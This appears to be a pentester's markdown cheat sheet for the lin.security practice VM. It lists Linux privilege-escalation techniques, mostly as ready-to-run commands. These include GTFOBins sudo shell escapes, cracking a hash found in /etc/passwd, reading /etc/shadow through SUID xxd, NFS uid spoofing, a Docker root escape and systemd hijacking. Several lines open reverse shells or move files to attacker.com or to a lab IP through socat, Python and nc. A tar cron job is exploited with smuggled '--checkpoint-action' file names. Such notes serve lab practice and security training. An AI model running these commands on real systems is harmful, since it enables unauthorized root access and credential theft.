---
title: lin-security + GTFO bins
category: linux privesc
order: 1
---

# 1 tip
---
“…Turn on privileged mode… If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, these actions are taken and the effective user id is set to the real user id. If the -p option is supplied at startup, the effective user id is not reset. Turning this option off causes the effective user and group ids to be set to the real user and group ids…”
```
bash -p
```
&nbsp;
# 2 gtfobins
---
## | check
```
sudo -l
User bob may run the following commands on linsecurity:
    (ALL) /bin/ash, /usr/bin/awk, /bin/bash, /bin/sh, /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed, /usr/bin/env, /usr/bin/expect, /usr/bin/find, /usr/bin/ftp, /usr/bin/less, /usr/bin/man, /bin/more, /usr/bin/scp, /usr/bin/socat,
        /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh, /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl, /usr/bin/tclsh, /usr/bin/git, /usr/bin/script, /usr/bin/scp
```

## | ash  
can be use to scape a restricted shell if granted sudo is easy privesc
```
sudo ash
```

## | awk
can be use to scape a restricted shell , if can run as sudo, insta privesc
```
sudo awk 'BEGIN {system("/bin/bash")}'
```

## | csh
like ash  

## | curl
#### \#  file read
```
LFILE=/tmp/file_to_read
curl file://$LFILE
```

## | ed
```
sudo ed
!/bin/bash
```

## | env

#### \#  shell
```
env /bin/sh
```
#### \#  sudo
```
sudo env /bin/sh
```

## expect
#### \# shell
```
sudo expect -c 'spawn /bin/sh;interact'
```
## find
#### \# shell
```
sudo find . -exec /bin/sh \; -quit
```
#### \# suid
```
sudo sh -c 'cp $(which find) .; chmod +s ./find'

./find . -exec /bin/sh -p \; -quit
```

## ftp  
#### \# shell
```
sudo ftp
!/bin/sh
```
## less
#### \# shell
```
sudo less /etc/profile
!/bin/sh
```

#### \# file read
```
less /etc/profile
:e file_to_read
```
## man
#### \# shell
```
sudo man man
!/bin/sh
```

## more
#### \# shell
```
TERM= sudo more /etc/profile
!/bin/sh
```

## scp
#### \# shell
```
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
```

## socat
#### \# shell
```
sudo socat stdin exec:/bin/sh
```

#### \# file upload
 on attacker run
 ```
 socat -u file:file_to_send tcp-listen:12345,reuseaddr
 ```
 on box:
 ```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
```

#### \# file download
on attacker run
```
socat -u file:file_to_send tcp-listen:12345,reuseaddr
```
on box
```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
```

## ssh
#### \# shell
```
ssh localhost $SHELL --noprofile --norc
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

## vi
#### \# shell
```
sudo vi -c ':!/bin/sh' /dev/nul
```
```
vi
:set shell=/bin/sh
:shell
```

## pico
#### \# shell
```
sudo pico
^R^X
reset; sh 1>&0 2>&0
```
## rvim
#### \# shell
```
sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
sudo rvim -c ':lua os.execute("reset; exec sh")'
```
#### \# reverse shell
on kali
```
socat file:`tty`,raw,echo=0 tcp-listen:12345
```
on box
```
export RHOST=attacker.com
export RPORT=12345
rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
```

## perl
#### \# shell
```
sudo perl -e 'exec "/bin/sh";'
```

## tclsh
#### \# shell
```
sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
```

## git
#### \# shell
```
PAGER='sh -c "exec sh 0<&1"' git -p help
sudo PAGER='sh -c "exec sh 0<&1"' git -p help
```

```
sudo git help config
!/bin/sh
```

## script
#### \# shell
```
script -q /dev/null
sudo script -q /dev/null
```

## strace

```
sudo strace -o /dev/null /bin/bash
```
&nbsp;
# 2 HASH  in /etc/passwd
---
```
cat /etc/passwd
insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh
```

```
echo AzER3pBZh6WZE > linisecurity
hashcat -m 1500 -a 0 linsecurity rockyou.txt --force
```

&nbsp;
# 3 CRON , TAR, wildcard
---
#### \# 1
```
cat /etc/crontab
*/1 #### \#   #### \# #### \# #### \#   root    /etc/cron.daily/backup
```
#### \# 2
```
cat /etc/cron.daily/backup
for i in $(ls /home); do cd /home/$i && /bin/tar -zcf /etc/backups/home-$i.tgz *; done
```
#### \# 3 start listener
```
nc -nlvp 443
```
#### \# 4 exploit tar wildcard use by cronjob
```
echo "mkfifo /tmp/mini; nc 192.168.100.220 443 0</tmp/mini | /bin/sh >/tmp/mini 2>&1; rm /tmp/mini" > /home/bob/shell.sh && chmod +x /home/bob/shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
&nbsp;
# 4 find hidden files
---
```
find / -name ".*" -type f -path "/home/*" 2>/dev/null
/home/susan/.secret
```
&nbsp;
# 5 SUID  1
---
#### \# find suid files
```
find / -perm -4000 -type f -exec ls -lah {} 2>/dev/null \;
```
#### \# xxd
```
xxd "/etc/shadow" | xxd -r
```
&nbsp;
# 6 SUID 2
---
#### \# find suid files
```
find / -perm -4000 -type f -exec ls -lah {} 2>/dev/null \;
```
#### \# taskset
```
taskset 1 /bin/bash -p
```
&nbsp;
# 7 NFS
---
```
showmount -e 192.168.100.111
mount 192.168.100.111:/home/peter /mnt/peter
```
we cant write to /mnt/peter (no_root_squash)
BUT, we can create an user with the same  uid/gid que en el export, y asi escribir al volumen montado y subir unas ssh keys

## check uid y gid
```
ls -lan
```

## create user in kali
```
root@kali:/tmp/peter# groupadd -g 1005 peter
root@kali:/tmp/peter# adduser peter -uid 1001 -gid 1005
root@kali:/tmp/peter# su peter
```
now we have write access to the nfs volume  
&nbsp;
# 8 DOCKER
---
rootplease
```
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```
&nbsp;
# 9 ver gtfobins
---
https://gtfobins.github.io/
&nbsp;
# 10 systemd
---
## check
```
ls -la /lib/systemd/system/
debug.system is owned by peter
```
## change
then we can change /lib/systemd/system/debug.system ExecStart= to a script that we want to run as root (ej reverseshell)
## restart service
probably we need to reboot the box
